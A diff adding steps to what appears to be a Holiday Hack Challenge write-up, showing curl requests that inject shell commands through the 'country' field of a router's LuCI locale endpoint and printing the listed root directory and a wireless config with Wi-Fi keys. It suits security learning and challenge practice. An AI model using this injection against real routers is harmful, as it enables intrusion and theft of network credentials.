@@ -32,4 +32,69 @@ https://www.exploit-db.com/exploits/51677
   -d 'operation=write&country=US'
 ```
 
+```
+┌──(test㉿KaliServer1)-[~]
+└─$ curl -k -X POST \
+  "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(ls)'
+
+bin
+cgi-bin
+dev
+etc
+home
+lib
+lib64
+mnt
+opt
+proc
+root
+sbin
+sys
+tmp
+usr
+var
+www
+```
+
+
+```
+┌──(test㉿KaliServer1)-[~]
+└─$ curl -k -X POST \
+  "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(cat /etc/config/wireless)'
+
+config wifi-device 'radio0'
+        option type 'mac80211'
+        option channel '6'
+        option hwmode '11g'
+        option path 'platform/ahb/18100000.wmac'
+        option htmode 'HT20'
+        option country 'US'
+
+config wifi-device 'radio1'
+        option type 'mac80211'
+        option channel '36'
+        option hwmode '11a'
+        option path 'pci0000:00/0000:00:00.0'
+        option htmode 'VHT80'
+        option country 'US'
+
+config wifi-iface 'default_radio0'
+        option device 'radio0'
+        option network 'lan'
+        option mode 'ap'
+        option ssid 'DOSIS-247_2.4G'
+        option encryption 'psk2'
+        option key 'SprinklesAndPackets2025!'
+
+config wifi-iface 'default_radio1'
+        option device 'radio1'
+        option network 'lan'
+        option mode 'ap'
+        option ssid 'DOSIS-247_5G'
+        option encryption 'psk2'
+        option key 'SprinklesAndPackets2025!'
+```
+
+
+
 <img width="782" height="699" alt="image" src="https://github.com/user-attachments/assets/ba88510b-b9fe-4a0e-9dca-6fbf76d22e31" />
